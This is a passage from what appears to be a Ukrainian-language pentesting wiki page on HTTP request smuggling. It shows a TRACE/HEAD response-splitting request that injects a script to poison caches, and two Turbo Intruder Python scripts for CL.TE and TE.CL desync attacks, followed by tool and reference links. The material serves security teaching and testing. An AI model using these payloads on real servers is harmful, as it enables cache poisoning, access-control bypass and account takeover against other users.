Продовженням [**this post**](https://portswigger.net/research/trace-desync-attack) пропонується інший спосіб зловживання методом TRACE. Як зазначалося, при smuggling HEAD і TRACE-запитів можливо **контролювати частину відображених даних** у відповіді на HEAD-запит. Довжина тіла HEAD-запиту фактично вказується у заголовку `Content-Length` і формується відповіддю на TRACE-запит.

Отже, нова ідея така: знаючи цей `Content-Length` і дані, що повертає TRACE-відповідь, можна зробити так, щоб відповідь TRACE містила валідну HTTP-відповідь після останнього байта, визначеного `Content-Length`, що дозволить атакуючому повністю контролювати запит для наступної відповіді (що може бути використано для cache poisoning).

Приклад:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Згенерує ці відповіді (зверніть увагу, як у відповіді на HEAD є Content-Length, через що відповідь TRACE стає частиною тіла HEAD, а коли Content-Length у HEAD закінчується, валідна HTTP-відповідь переправляється):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Застосування HTTP Request Smuggling за допомогою HTTP Response Desynchronisation

Ви знайшли вразливість HTTP Request Smuggling і не знаєте, як її експлуатувати? Спробуйте ці інші методи експлуатації:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Інші техніки HTTP Request Smuggling

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder scripts

### CL.TE

Джерело [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Джерело: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Інструменти

- HTTP Hacker (Burp BApp Store) – візуалізує конкатенацію/фреймінг та низькорівневу поведінку HTTP
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Цей інструмент — HTTP Fuzzer на основі граматики, корисний для виявлення дивних нестиковок у request smuggling.

## Посилання

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Остерігайтеся помилки «false false‑positive»: як відрізнити HTTP pipelining від request smuggling – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)


{{#include ../../banners/hacktricks-training.md}}
